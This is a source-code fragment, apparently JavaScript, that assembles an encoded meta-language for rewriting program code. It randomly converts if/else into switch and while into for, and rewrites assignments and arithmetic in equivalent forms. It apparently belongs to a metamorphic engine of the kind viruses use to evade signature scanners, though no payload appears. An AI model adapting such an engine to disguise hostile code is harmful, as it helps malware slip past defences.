            MetaLevelLanguage+='__(CBCB100|)var CBCnewStringToReplace=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#x3fGiveMeString(#n35n#)+fGiveMeString(#n34n#)3x#)2x#+#n2n#,#x4°+CBCSingleElement+°.indexOf(#x5fGiveMeString(#n34n#)+fGiveMeString(#n35n#)5x#)4x#)1O#1x#';        
            MetaLevelLanguage+='__(CBCB200|CBCB100)y°+CBCSingleElement+°=#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#x2°+CBCSingleElement+°.indexOf(#x3fGiveMeString(#n35n#)+fGiveMeString(#n34n#)3x#)2x#)1O#1x#+#x4fCreateString(#x5°+CBCnewStringToReplace+°5x#)4x#+ #x6°+CBCSingleElement+°.substring(#x7°+CBCSingleElement+°.indexOf(#x8fGiveMeString(#n34n#)+fGiveMeString(#n35n#)8x#)7x#+#x9#n2n#9x#)6x#'; 
        MetaLevelLanguage+='__(CBCA300|CBCA100)while($#x1#O1°+CBCSingleElement+°#.indexOf(#x2#x3fGiveMeString(#n35n#)3x#+#x4fGiveMeString(#n110n#)4x#2x#)1O#1x#!#n-1n#?!=@)003';
            MetaLevelLanguage+='__(CBCB050|)var CBCnewNumberStart=#x1°+CBCSingleElement+°.indexOf(#x2fGiveMeString(#n35n#)+fGiveMeString(#n110n#)2x#)+#n2n#1x#';  
            MetaLevelLanguage+='__(CBCB100|CBCB050)var CBCnewNumberToReplace=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCnewNumberStart+°2x#,#x3°+CBCSingleElement+°.indexOf(#x4fGiveMeString(#n110n#)+fGiveMeString(#n35n#)4x#,#x5°+CBCnewNumberStart+°5x#)3x#)1O#1x#';
            MetaLevelLanguage+='__(CBCB200|CBCB100)y°+CBCSingleElement+°=#x1#x2#O1°+CBCSingleElement+°#.substring(#n0n#,#x3°+CBCSingleElement+°.indexOf(#x4fGiveMeString(#n35n#)+fGiveMeString(#n110n#)4x#)3x#)1O#2x#+#x5fCreateNumeric(#x6°+CBCnewNumberToReplace+°6x#)5x#+ #x7°+CBCSingleElement+°.substring(#x8°+CBCSingleElement+°.indexOf(#x9fGiveMeString(110)+fGiveMeString(35)9x#,°+CBCnewNumberStart+°)+#n2n#8x#)7x#1x#';
        MetaLevelLanguage+='__(CBCA400|CBCA200,CBCA300)y°+CBCSingleElement+°=#x1fCreateObjectExecution(#x2°+CBCSingleElement+°2x#)1x#';
        MetaLevelLanguage+='__(CBCA500|CBCA400)y°+CBCSingleElement+°=#x1fExecutionParser(#x2°+CBCSingleElement+°2x#)1x#';       
        MetaLevelLanguage+='__(CBCB050|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n2n#)1O#1x#!#x2#"if"#2x#?==)075';
            MetaLevelLanguage+='__(CBC0100|)var CBCcondition=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#"("#)+#n1n#2x#,#x3°+CBCSingleElement+°.lastIndexOf(#")"#)3x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0200|)var CBCNumOfElementsCode=#x1parseInt(#x2#O1°+CBCSingleElement+°#.substring(#x3#x4°+CBCSingleElement+°.lastIndexOf(#")"#)4x#+#n1n#3x#)1O#2x#,#n10n#)1x#';
            MetaLevelLanguage+='__(CBC0300|CBC0200)var NumOfElementsAntiCode=#x1parseInt(#x2#x3°+argCodeBlockArray+°3x#[#x7#x4°+CBCCodeLineIndex+°4x# + #x5°+CBCNumOfElementsCode+°5x# +#x6#n1n#6x#7x#]2x#,#n10n#)1x#';          
            MetaLevelLanguage+='__(CBC0400|CBC0200)var CBCExecuteCode=#x1#O1°+argCodeBlockArray+°#.slice(#x2#x6°+CBCCodeLineIndex+°6x# +#n1n#2x#,#x3#x4°+CBCCodeLineIndex+°4x# + #x5°+CBCNumOfElementsCode+°5x# +#n1n#3x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0500|CBC0300)var CBCifAntiCode=#x1#O1°+argCodeBlockArray+°#.slice(#x4#x2°+CBCCodeLineIndex+°2x# + #x3°+CBCNumOfElementsCode+°3x# +#n2n#4x#,#x5#x6°+CBCCodeLineIndex+°6x# + #x7°+CBCNumOfElementsCode+°7x# + #x8°+NumOfElementsAntiCode+°8x# +#n2n#5x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0525|CBC0300)var CBCLogicOperator=#x1#O1°+CBCSingleElement+°#.substring(#x2#x3°+CBCSingleElement+°.indexOf(#"?"#)3x#+#n1n#2x#,#x4°+CBCSingleElement+°.lastIndexOf(#x5#")"#5x#)4x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0550|CBC0525)var CBClogic1=#x1#x2(#x4°+CBCLogicOperator+°4x#==#"=="#)2x#&&#x3(#x5#x6fGiveRandomNumber(#n2n#)6x#==#n0n#5x#)3x#1x#'      
            MetaLevelLanguage+='__(CBC0600|CBC0100,CBC0400,CBC0500,CBC0550)if(#x1°+CBClogic1+°1x#!#x2#n0n#2x#?!=)042';            
                MetaLevelLanguage+='__(CBC100|)var CBCifargument1=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#"("#)+#n1n#2x#,#x3°+CBCSingleElement+°.indexOf(#"!"#)3x#)1O#1x#';
                MetaLevelLanguage+='__(CBC200|)var CBCifargument2=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#"!"#)+#n1n#2x#,#x3°+CBCSingleElement+°.indexOf(#"?"#)3x#)1O#1x#';
                MetaLevelLanguage+='__(CBC300|)var CBCifdefcode=#x1#""#1x#';                
                MetaLevelLanguage+='__(CBC400|CBC300)if(#x1#O1°+CBCifAntiCode+°#.length1O#1x#!#x2#n0n#2x#?>)014';
                    MetaLevelLanguage+='__(CBC100|)c+s(°+CBCifdefcode+°,#x2#"defaul"#2x#)';
                    MetaLevelLanguage+='__(CBC200|CBC100)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n116n#)2x#)';
                    MetaLevelLanguage+='__(CBC300|CBC200)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n58n#)2x#)';
                    MetaLevelLanguage+='__(CBC400|CBC300)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n33n#)2x#)';
                    MetaLevelLanguage+='__(CBC500|CBC400)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n64n#)2x#)';
                    MetaLevelLanguage+='__(CBC600|CBC500)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n123n#)2x#)';
                    MetaLevelLanguage+='__(CBC700|CBC600)c+s(°+CBCifdefcode+°,#x2fCreateBlockOfCode(#x3°+CBCifAntiCode+°3x#)2x#)';
                    MetaLevelLanguage+='__(CBC800|CBC700)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n33n#)2x#)'; 
                    MetaLevelLanguage+='__(CBC900|CBC800)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n64n#)2x#)'; 
                    MetaLevelLanguage+='__(CBC110|CBC900)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n125n#)2x#)'; 
                    MetaLevelLanguage+='__(CBC120|CBC110)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n59n#)2x#)'; 
                    MetaLevelLanguage+='__(CBC130|CBC120)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n98n#)2x#)';
                    MetaLevelLanguage+='__(CBC140|CBC130)c+s(°+CBCifdefcode+°,#x2"reak"2x#)';
                    MetaLevelLanguage+='__(CBC150|CBC140)c+s(°+CBCifdefcode+°,#x2fGiveMeString(#n59n#)2x#)';                                                                                                                                                                                                                                                                                                                                                    
                MetaLevelLanguage+='__(CBC500|)000';                
                MetaLevelLanguage+='__(CBC600|)c+s(°+CBCRString+°,#x1#"switch("#1x#)'
                MetaLevelLanguage+='__(CBC700|CBC100,CBC600)c+s(°+CBCRString+°,#x1°+CBCifargument1+°1x#)';                                   
                MetaLevelLanguage+='__(CBC800|CBC700)c+s(°+CBCRString+°,#x1fGiveMeString(#n41n#)1x#)';
                MetaLevelLanguage+='__(CBC900|CBC800)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
                MetaLevelLanguage+='__(CBC110|CBC900)c+s(°+CBCRString+°,#x1fGiveMeString(#n123n#)1x#)';
                MetaLevelLanguage+='__(CBC210|CBC110)c+s(°+CBCRString+°,#x1fGiveMeString(#n99n#)1x#)';
                MetaLevelLanguage+='__(CBC220|CBC210)c+s(°+CBCRString+°,#x1#"ase "#1x#)';
                MetaLevelLanguage+='__(CBC230|CBC200,CBC220)c+s(°+CBCRString+°,#x1°+CBCifargument2+°1x#)';
                MetaLevelLanguage+='__(CBC240|CBC230)c+s(°+CBCRString+°,#x1fGiveMeString(#n58n#)1x#)';
                MetaLevelLanguage+='__(CBC250|CBC240)c+s(°+CBCRString+°,#x1fGiveMeString(#n33n#)1x#)';
                MetaLevelLanguage+='__(CBC260|CBC250)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
                MetaLevelLanguage+='__(CBC270|CBC260)c+s(°+CBCRString+°,#x1fGiveMeString(#n123n#)1x#)';
                MetaLevelLanguage+='__(CBC280|CBC270)c+s(°+CBCRString+°,#x1fCreateBlockOfCode(#x2°+CBCExecuteCode+°2x#)1x#)';
                MetaLevelLanguage+='__(CBC290|CBC280)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';
                MetaLevelLanguage+='__(CBC300|CBC290)c+s(°+CBCRString+°,#x1fGiveMeString(#n98n#)1x#)';
                MetaLevelLanguage+='__(CBC310|CBC300)c+s(°+CBCRString+°,#x1#"reak"#1x#)';
                MetaLevelLanguage+='__(CBC320|CBC310)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';
                MetaLevelLanguage+='__(CBC330|CBC320)c+s(°+CBCRString+°,#x1fGiveMeString(#n33n#)1x#)';
                MetaLevelLanguage+='__(CBC340|CBC330)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
                MetaLevelLanguage+='__(CBC350|CBC340)c+s(°+CBCRString+°,#x1fGiveMeString(#n125n#)1x#)';
                MetaLevelLanguage+='__(CBC360|CBC350,CBC400)c+s(°+CBCRString+°,#x1°+CBCifdefcode+°1x#)';
                MetaLevelLanguage+='__(CBC370|CBC360)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
                MetaLevelLanguage+='__(CBC380|CBC370)c+s(°+CBCRString+°,#x1fGiveMeString(#n125n#)1x#)';                                                                                                                                                                                                                                                                                                        
            MetaLevelLanguage+='__(CBC0700|)021';            
                MetaLevelLanguage+='__(CBCe100|)var CBCelsecodeinclude=#x1#""#1x#';                
                MetaLevelLanguage+='__(CBCe200|CBCe100)if(#x1#O1°+CBCifAntiCode+°#.length1O#1x#!#x2#n0n#2x#?>)007';
                    MetaLevelLanguage+='__(CBCe100|)c+s(°+CBCelsecodeinclude+°,#x1#"els"#1x#)';
                    MetaLevelLanguage+='__(CBCe200|CBCe100)c+s(°+CBCelsecodeinclude+°,#x1#"e"#1x#)';
                    MetaLevelLanguage+='__(CBCe300|CBCe200)c+s(°+CBCelsecodeinclude+°,#x1fGiveMeString(#n64n#)1x#)';
                    MetaLevelLanguage+='__(CBCe400|CBCe300)c+s(°+CBCelsecodeinclude+°,#x1fGiveMeString(#n123n#)1x#)'; 
                    MetaLevelLanguage+='__(CBCe500|CBCe400)c+s(°+CBCelsecodeinclude+°,#x1fCreateBlockOfCode(#x2°+CBCifAntiCode+°2x#)1x#)';  
                    MetaLevelLanguage+='__(CBCe600|CBCe500)c+s(°+CBCelsecodeinclude+°,#x1fGiveMeString(#n64n#)1x#)';  
                    MetaLevelLanguage+='__(CBCe700|CBCe600)c+s(°+CBCelsecodeinclude+°,#x1fGiveMeString(#n125n#)1x#)';                                                                                  
                MetaLevelLanguage+='__(CBCe300|)000';       
                MetaLevelLanguage+='__(CBCe400|)var CBCtmpLL=#x1fCreateLogic(#x2°+CBCcondition+°2x#)1x#';
                MetaLevelLanguage+='__(CBCe500|CBCe400)c+s(°+CBCRString+°,#x1sDeriveRestrString1x#)';
                MetaLevelLanguage+='__(CBCe600|CBCe500)c+s(°+CBCRString+°,#x1#"if("#1x#)';
                MetaLevelLanguage+='__(CBCe700|CBCe600)c+s(°+CBCRString+°,#x1°+CBCtmpLL+°1x#)';
                MetaLevelLanguage+='__(CBCe800|CBCe700)c+s(°+CBCRString+°,#x1#")"#1x#)';
                MetaLevelLanguage+='__(CBCe900|CBCe800)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
                MetaLevelLanguage+='__(CBCe105|CBCe900)c+s(°+CBCRString+°,#x1fGiveMeString(#n123n#)1x#)';
                MetaLevelLanguage+='__(CBCe110|CBCe105)c+s(°+CBCRString+°,#x1fCreateBlockOfCode(#x2°+CBCExecuteCode+°2x#)1x#)';   
                MetaLevelLanguage+='__(CBCe120|CBCe110)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';   
                MetaLevelLanguage+='__(CBCe130|CBCe120)c+s(°+CBCRString+°,#x1fGiveMeString(#n125n#)1x#)';   
                MetaLevelLanguage+='__(CBCe140|CBCe200,CBCe130)c+s(°+CBCRString+°,#x1°+CBCelsecodeinclude+°1x#)';                                                                                                                                                    
            MetaLevelLanguage+='__(CBC0800|CBC0600)c+n(°+CBCCodeLineIndex+°,#x1°+CBCNumOfElementsCode+°1x#)';
            MetaLevelLanguage+='__(CBC0900|CBC0600)c+n(°+CBCCodeLineIndex+°,#x1°+NumOfElementsAntiCode+°1x#)';
            MetaLevelLanguage+='__(CBC1000|CBC0600)c+n(°+CBCCodeLineIndex+°,#x1#n2n#1x#)';
        MetaLevelLanguage+='__(CBCB060|)000';        
        MetaLevelLanguage+='__(CBCB070|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n5n#)1O#1x#!#x2#x3#"wh"#3x#+#x4#"ile"#4x#2x#?==)047';
            MetaLevelLanguage+='__(CBC0100|)var CBCwhinitial=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#x4fGiveMeString(#n40n#)4x#)+#n1n#2x#,#x3°+CBCSingleElement+°.indexOf(#x6fGiveMeString(#n36n#)6x#)3x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0200|)var CBCwhcondition=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#x5fGiveMeString(#n36n#)5x#)+#n1n#2x#,#x3°+CBCSingleElement+°.indexOf(#x4fGiveMeString(#n64n#)4x#)3x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0300|)var CBCwhaction=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#x4fGiveMeString(#n64n#)4x#)+#n1n#2x#,#x3°+CBCSingleElement+°.lastIndexOf(#x5fGiveMeString(#n41n#)5x#)3x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0400|)var CBCwhNumOfElementsCode=#x1parseInt(#x2#O1°+CBCSingleElement+°#.substring(#x3°+CBCSingleElement+°.lastIndexOf(#x4fGiveMeString(#n41n#)4x#)3x#+#n1n#)1O#2x#,#n10n#)1x#'; 
            MetaLevelLanguage+='__(CBC0500|CBC0400)var CBCwhExecuteCode=#x1#O1°+argCodeBlockArray+°#.slice(#x2#x3°+CBCCodeLineIndex+°3x# +#n1n#2x#,#x4#x5°+CBCCodeLineIndex+°5x# + #x6°+CBCwhNumOfElementsCode+°6x# +#n1n#4x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0600|)var CBCwhRNum2=#x1fGiveRandomNumber(#x2#n2n#2x#)1x#';
            MetaLevelLanguage+='__(CBC0700|)c+1(°+sNoDerivation1+°)';
            MetaLevelLanguage+='__(CBC0800|CBC0200,CBC0700)var CBCwhRLogic=#x1fCreateLogic(#x2°+CBCwhcondition+°2x#)1x#';
            MetaLevelLanguage+='__(CBC0900|CBC0800)ysNoDerivation1=#x1#n0n#1x#';
            MetaLevelLanguage+='__(CBC1000|CBC0100,CBC0300,CBC0500,CBC0600,CBC0900)if(#x1°+CBCwhRNum2+°1x#!#x2#n0n#2x#?==)016';
                MetaLevelLanguage+='__(CBC0100|)if(#x1#O1°+CBCwhinitial+°#.length1O#1x#!#x2#n0n#2x#?>)002';
                    MetaLevelLanguage+='__(CBC0100|CBC0110)yCBCLocalVarName.push(#x1#O1°+CBCwhinitial+°#.substring(#n4n#,#x2°+CBCwhinitial+°.indexOf(#x3fGiveMeString(#n61n#)3x#)2x#)1O#1x#)';                    
                    MetaLevelLanguage+='__(CBC0200|)yCBCLocalVarDefs.push(#x1#O1°+CBCwhinitial+°#.substring(#x2°+CBCwhinitial+°.indexOf(#x3fGiveMeString(61)3x#)+#n1n#2x#)1O#1x#)';
                MetaLevelLanguage+='__(CBC0200|)000';
                MetaLevelLanguage+='__(CBC0300|CBC0100)c+s(°+CBCRString+°,#x1sDeriveRestrString1x#)';
                MetaLevelLanguage+='__(CBC0400|CBC0300)c+s(°+CBCRString+°,#x1#"while("#1x#)';
                MetaLevelLanguage+='__(CBC0500|CBC0400)c+s(°+CBCRString+°,#x1°+CBCwhRLogic+°1x#)';
                MetaLevelLanguage+='__(CBC0600|CBC0500)c+s(°+CBCRString+°,#x1#")"#1x#)';                            
                MetaLevelLanguage+='__(CBC0700|CBC0600)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
                MetaLevelLanguage+='__(CBC0800|CBC0700)c+s(°+CBCRString+°,#x1fGiveMeString(#n123n#)1x#)';
                MetaLevelLanguage+='__(CBC0900|CBC0800)c+s(°+CBCRString+°,#x1fCreateBlockOfCode(#x2°+CBCwhExecuteCode+°2x#)1x#)';                                               
                MetaLevelLanguage+='__(CBC1000|CBC0900)if(#x1#O1°+CBCwhaction+°#.length1O#1x#!#x2#n0n#2x#?>)001';                
                    MetaLevelLanguage+='__(CBC0100|)c+s(°+CBCRString+°,#x1fCreateExecution(#x2°+CBCwhaction+°2x#,#x3#n1n#3x#)1x#)';
                MetaLevelLanguage+='__(CBC1100|)000';
                MetaLevelLanguage+='__(CBC1200|CBC1000)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';           
                MetaLevelLanguage+='__(CBC1300|CBC1200)c+s(°+CBCRString+°,#x1fGiveMeString(#n125n#)1x#)';  
            MetaLevelLanguage+='__(CBC1100|)000';
            MetaLevelLanguage+='__(CBC1200|CBC0100,CBC0300,CBC0500,CBC0600,CBC0900)if(#x1°+CBCwhRNum2+°1x#!#x2#n1n#2x#?==)016';
                MetaLevelLanguage+='__(CBC0100|)ysNoDerivation1=#x1#n1n#1x#';
                MetaLevelLanguage+='__(CBC0200|CBC0100)c+s(°+CBCRString+°,#x1sDeriveRestrString1x#)';
                MetaLevelLanguage+='__(CBC0300|CBC0200)c+s(°+CBCRString+°,#x1#"fo"#1x#)';
                MetaLevelLanguage+='__(CBC0400|CBC0300)c+s(°+CBCRString+°,#x1#"r("#1x#)';                
                MetaLevelLanguage+='__(CBC0500|CBC0400)c+s(°+CBCRString+°,#x1°+CBCwhinitial+°1x#)';
                MetaLevelLanguage+='__(CBC0600|CBC0500)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';
                MetaLevelLanguage+='__(CBC0700|CBC0600)c+s(°+CBCRString+°,#x1°+CBCwhRLogic+°1x#)';
                MetaLevelLanguage+='__(CBC0800|CBC0700)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';
                MetaLevelLanguage+='__(CBC0900|CBC0800)c+s(°+CBCRString+°,#x1°+CBCwhaction+°1x#)';   
                MetaLevelLanguage+='__(CBC1000|CBC0900)c+s(°+CBCRString+°,#x1fGiveMeString(#n41n#)1x#)';                                                                                                                                 
                MetaLevelLanguage+='__(CBC1100|CBC1000)ysNoDerivation1=#x1#n0n#1x#';
                MetaLevelLanguage+='__(CBC1200|CBC1100)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
                MetaLevelLanguage+='__(CBC1300|CBC1200)c+s(°+CBCRString+°,#x1fGiveMeString(#n123n#)1x#)';
                MetaLevelLanguage+='__(CBC1400|CBC1300)c+s(°+CBCRString+°,#x1fCreateBlockOfCode(°+CBCwhExecuteCode+°)1x#)';   
                MetaLevelLanguage+='__(CBC1500|CBC1400)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';           
                MetaLevelLanguage+='__(CBC1600|CBC1500)c+s(°+CBCRString+°,#x1fGiveMeString(#n125n#)1x#)';  
            MetaLevelLanguage+='__(CBC1300|)000';
            MetaLevelLanguage+='__(CBC1400|CBC1000,CBC1200)c+n(°+CBCCodeLineIndex+°,#x1°+CBCwhNumOfElementsCode+°1x#)';
            MetaLevelLanguage+='__(CBC1500|CBC1000,CBC1200)c+1(°+CBCCodeLineIndex+°)';            
        MetaLevelLanguage+='__(CBCB080|)000';                   
        MetaLevelLanguage+='__(CBCB081|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n1n#)1O#1x#!#x2#"c"#2x#?==)042';        
            MetaLevelLanguage+='__(CBC0100|)var CBCcCalcCode=#x1#""#1x#';
            MetaLevelLanguage+='__(CBC0200|CBC0100)if(#x1#O1°+CBCSingleElement+°#.substring(#n2n#,#n3n#)1O#1x#!#x2#"1"#2x#?==)007';            
                MetaLevelLanguage+='__(CBC0100|)var CBCVariable1=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#"("#)+#n1n#2x#,#x3°+CBCSingleElement+°.lastIndexOf(#")"#)3x#)1O#1x#';
                MetaLevelLanguage+='__(CBC0200|)var CBCVariable2=#x1#n1n#1x#';
                MetaLevelLanguage+='__(CBC0300|CBC0100)if(#x1fGiveRandomNumber(#n3n#)1x#!#n0n#?==)003';
                    MetaLevelLanguage+='__(CBC0100|)y°+CBCcCalcCode+°=#x1°+CBCVariable1+°1x#';
                    MetaLevelLanguage+='__(CBC0200|CBC0100)c+s(°+CBCcCalcCode+°,#x1fGiveMeString(#n64n#)1x#)';
                    MetaLevelLanguage+='__(CBC0300|CBC0200)c+s(°+CBCcCalcCode+°,#x1fGiveMeString(#n64n#)1x#)';                                         
                MetaLevelLanguage+='__(CBC0400|)000';
            MetaLevelLanguage+='__(CBC0300|)002';
                MetaLevelLanguage+='__(CBC0100|)var CBCVariable1=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#"("#)+#n1n#2x#,#x3°+CBCSingleElement+°.indexOf(#","#)3x#)1O#1x#';
                MetaLevelLanguage+='__(CBC0200|)var CBCVariable2=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#","#)+#n1n#2x#,#x3°+CBCSingleElement+°.lastIndexOf(#")"#)3x#)1O#1x#';                
            MetaLevelLanguage+='__(CBC0400|)ysDeriveRestrString=#x1#""#1x#';            
            MetaLevelLanguage+='__(CBC0500|CBC0200,CBC0400)if(#x1°+CBCcCalcCode+°1x#!#x2#""#2x#?==)019';
                MetaLevelLanguage+='__(CBC0100|)var CBCcWhichCalc=#x1fGiveRandomNumber(#n2n#)1x#';
                MetaLevelLanguage+='__(CBC0200|CBC0100)if(#x1°+CBCcWhichCalc+°1x#!#x2#n0n#2x#?==)003';
                    MetaLevelLanguage+='__(CBC0100|)c+s(°+CBCcCalcCode+°,#x1°+CBCVariable1+°1x#)';
                    MetaLevelLanguage+='__(CBC0200|CBC0100)c+s(°+CBCcCalcCode+°,#x1fGiveMeString(#n64n#)+fGiveMeString(#n61n#)1x#)';                               
                    MetaLevelLanguage+='__(CBC0300|CBC0200)c+s(°+CBCcCalcCode+°,#x1fDeriveRestrictVC(#x2°+CBCVariable2+°2x#,#x3#n20n#3x#)1x#)';                                          
                MetaLevelLanguage+='__(CBC0300|)013';
                    MetaLevelLanguage+='__(CBC0100|)var CBCSomeLog=#x1(#x2#O1°+CBCSingleElement+°#.substring(2,3)1O#==#"n"#2x#&&#x3fGiveRandomNumber(#n2n#)3x#)1x#';
                    MetaLevelLanguage+='__(CBC0200|CBC0100)if(#x1°+CBCSomeLog+°1x#!#x2#n0n#2x#?!=)005';
                        MetaLevelLanguage+='__(CBC0100|)c+s(°+CBCcCalcCode+°,#x1°+CBCVariable1+°1x#)';
                        MetaLevelLanguage+='__(CBC0200|CBC0100)c+s(°+CBCcCalcCode+°,#x1#"="#1x#)';
                        MetaLevelLanguage+='__(CBC0300|CBC0200)c+s(°+CBCcCalcCode+°,#x1fDeriveRestrictVC(#x2°+CBCVariable2+°2x#,#x3#n30n#3x#)1x#)';
                        MetaLevelLanguage+='__(CBC0400|CBC0300)c+s(°+CBCcCalcCode+°,#x1fGiveMeString(#x2#n64n#2x#)1x#)';
                        MetaLevelLanguage+='__(CBC0500|CBC0400)c+s(°+CBCcCalcCode+°,#x1fDeriveRestrictVC(#x2°+CBCVariable1+°2x#,#x3#n30n#3x#)1x#)';                      
                    MetaLevelLanguage+='__(CBC0300|)005';
                        MetaLevelLanguage+='__(CBC0100|)c+s(°+CBCcCalcCode+°,#x1°+CBCVariable1+°1x#)';
                        MetaLevelLanguage+='__(CBC0200|CBC0100)c+s(°+CBCcCalcCode+°,#x1#"="#1x#)';  
                        MetaLevelLanguage+='__(CBC0300|CBC0200)c+s(°+CBCcCalcCode+°,#x1fDeriveRestrictVC(#x2°+CBCVariable1+°2x#,#x3#n30n#3x#)1x#)';  
                        MetaLevelLanguage+='__(CBC0400|CBC0300)c+s(°+CBCcCalcCode+°,#x1fGiveMeString(#x2#n64n#2x#)1x#)';  
                        MetaLevelLanguage+='__(CBC0500|CBC0400)c+s(°+CBCcCalcCode+°,#x1fDeriveRestrictVC(#x2°+CBCVariable2+°2x#,#x3#n30n#3x#)1x#)';                                                                                                                                            
            MetaLevelLanguage+='__(CBC0600|)000';            
            MetaLevelLanguage+='__(CBC0700|)var PMOperator=#x1#O1°+CBCSingleElement+°#.substring(#n1n#,#n2n#)1O#1x#';
            MetaLevelLanguage+='__(CBC0800|CBC0500,CBC0700)while($#x1#O1°+CBCcCalcCode+°#.indexOf(#x2fGiveMeString(#n64n#)2x#)1O#1x#!#x3#n-1n#3x#?!=@)001';
                MetaLevelLanguage+='__(CBC0100|)y°+CBCcCalcCode+°=#x1#O1°+CBCcCalcCode+°#.replace(#x2fGiveMeString(#n64n#)2x#,#x3°+PMOperator+°3x#)1O#1x#';    
            MetaLevelLanguage+='__(CBC0900|CBC0800)c+s(°+CBCRString+°,#x1sDeriveRestrString1x#)';
            MetaLevelLanguage+='__(CBC1000|CBC0900)c+s(°+CBCRString+°,#x1°+CBCcCalcCode+°1x#)';
            MetaLevelLanguage+='__(CBC1100|CBC1000)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBC1200|CBC1100)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';                         
            MetaLevelLanguage+='__(CBC1500|CBC1200)c+1(°+CBCCodeLineIndex+°)';
        MetaLevelLanguage+='__(CBCB082|)000';                 
          MetaLevelLanguage+='__(CBCB100|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n1n#)1O#1x#!#x2#"x"#2x#?==)005';    
            MetaLevelLanguage+='__(CBCC100|)var xxExecuteableCode=#x1#O1°+CBCSingleElement+°#.substring(#n1n#)1O#1x#';
            MetaLevelLanguage+='__(CBCC200|CBCC100)c+s(°+CBCRString+°,#x1fCreateExecution(#x2°+xxExecuteableCode+°2x#)1x#)';
            MetaLevelLanguage+='__(CBCC300|CBCC200)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBCC400|CBCC300)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';                                              
            MetaLevelLanguage+='__(CBCC700|CBCC400)c+1(°+CBCCodeLineIndex+°)';      
        MetaLevelLanguage+='__(CBCB110|)000';                      
        MetaLevelLanguage+='__(CBCB200|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n1n#)1O#1x#!"y"?==)005';    
            MetaLevelLanguage+='__(CBCC100|)var yyExecuteableCode=#x1#O1°+CBCSingleElement+°#.substring(#n1n#)1O#1x#';
            MetaLevelLanguage+='__(CBCC200|CBCC100)c+s(°+CBCRString+°,#x1fCreateExecution(°+yyExecuteableCode+°,1)1x#)';
            MetaLevelLanguage+='__(CBCC300|CBCC200)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBCC400|CBCC300)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';                                              
            MetaLevelLanguage+='__(CBCC700|CBCC400)c+1(°+CBCCodeLineIndex+°)';   
        MetaLevelLanguage+='__(CBCB210|)000';                         
        MetaLevelLanguage+='__(CBCB300|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n3n#)1O#1x#!#x2#"def"#2x#?==)004';    
            MetaLevelLanguage+='__(CBCC200|)c+s(°+CBCRString+°,#x1fCreateExecution(#x2#O1°+CBCSingleElement+°#.substring(4)1O#2x#,#x3#n0n#3x#)1x#)';
            MetaLevelLanguage+='__(CBCC300|CBCC200)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBCC400|CBCC300)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';                                          
            MetaLevelLanguage+='__(CBCC700|CBCC400)c+1(°+CBCCodeLineIndex+°)';      
        MetaLevelLanguage+='__(CBCB310|)000';  
